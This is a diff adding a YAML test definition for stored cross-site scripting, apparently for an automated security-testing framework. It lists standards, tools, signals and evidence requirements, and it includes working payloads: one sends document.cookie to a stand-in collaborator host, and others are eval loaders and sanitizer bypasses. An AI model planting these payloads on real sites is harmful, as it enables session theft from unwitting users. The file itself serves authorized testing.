@@ -1,0 +1,103 @@
+id: xss-stored
+name: Stored (Persistent) XSS
+category: xss
+description: |
+  Malicious script is permanently stored on the target server (database, comment
+  field, user profile, message, forum post) and served to every user who views
+  the infected page. No user interaction beyond visiting the page is required.
+  This is the most dangerous XSS variant — worms can spread autonomously.
+  Commonly found in comment sections, user profiles, message boards, support
+  tickets, and any user-generated content that is stored and displayed.
+severity: high
+standards:
+  wstg:
+    - WSTG-INPV-02
+  asvs:
+    - "V3.4.3"
+    - "V3.2.2"
+    - "V3.2.1"
+  vrt:
+    - cross_site_scripting_xss.stored
+  cwe:
+    - CWE-79
+applies_to:
+  archetypes:
+    - all
+  surfaces:
+    - user-content-submission
+    - comment-systems
+    - profile-fields
+    - messaging-systems
+    - forum-posts
+    - support-tickets
+requires:
+  auth: single_account
+  inputs:
+    - list of input forms from katana crawl
+    - parameters that accept text content (textarea, rich text editors)
+    - authenticated session cookies
+  tools:
+    - curl
+    - dalfox
+    - katana
+    - httpx
+    - burp_suite
+signals:
+  positive:
+    - Payload persists after page reload in an unauthenticated context
+    - Stored input reflected across multiple sessions without encoding
+    - HTML tags rendered when viewed by a different user account
+    - dalfox with --cookie detects stored execution
+    - Admin view renders user-submitted content without sanitization
+  negative:
+    - Server-side HTML sanitization applied (DOMPurify, bleach, OWASP Java HTML Sanitizer)
+    - Content rendered via React's dangerouslySetInnerHTML is a false positive if JSX elsewhere
+    - Markdown-to-HTML conversion with sanitization enabled
+    - CSP blocks execution even though HTML is stored
+    - User input stored but only shown to the submitting user (self-XSS, lower severity)
+safety:
+  intrusive: false
+  data_modifying: true
+  rate_limited: false
+  requires_approval: false
+evidence:
+  required:
+    - curl request creating the stored payload
+    - second curl or browser screenshot showing execution for a different user
+    - proof that the payload is served from the database/server (not just URL)
+    - har trace showing full store-then-retrieve flow
+references:
+  urls:
+    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting
+    - https://portswigger.net/web-security/cross-site-scripting/stored
+  papers:
+    - "DOM-Based Cross-Site Scripting (Amit Klein)"
+    - "OWASP XSS Prevention Cheat Sheet"
+  writeups: []
+workflow_mapping:
+  skill: xss
+  workflow: W2 (stored XSS)
+payload_families:
+  - name: stored_basic
+    description: Payloads designed for storage and later retrieval
+    examples:
+      - '<img src=x onerror=fetch("https://collab.example.com?c="+document.cookie)>'
+      - '<svg/onload=eval(atob("..."))>'
+  - name: rich_text_bypass
+    description: Bypasses for WYSIWYG editors and markdown renderers
+    examples:
+      - '<a href="javascript:alert(1)">click</a>'
+      - '<iframe src="data:text/html,<script>alert(1)</script>">'
+      - '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>'
+  - name: mutation_xss
+    description: Payloads exploiting browser mutation behavior
+    examples:
+      - '<noscript><p title="</noscript><img src=x onerror=alert(1)>">'
+      - '<table><background="javascript:alert(1)">'
+tags:
+  - stored
+  - persistent
+  - authenticated
+  - user-content
+  - database-backed
+  - worms
